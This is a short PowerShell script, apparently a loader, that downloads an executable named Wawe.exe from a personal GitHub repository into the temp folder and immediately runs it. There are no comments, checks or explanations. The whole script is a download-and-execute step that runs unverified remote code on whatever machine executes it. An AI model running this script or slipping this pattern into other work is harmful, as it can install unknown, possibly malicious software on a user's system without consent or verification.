$d = "$env:TEMP\Wawe.exe"
Remove-Item $d -Force -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri 'https://github.com/jesuss13377-source/wa/raw/refs/heads/main/Wawe.exe' -OutFile $d -UseBasicParsing
if (Test-Path $d) { Start-Process -FilePath $d }
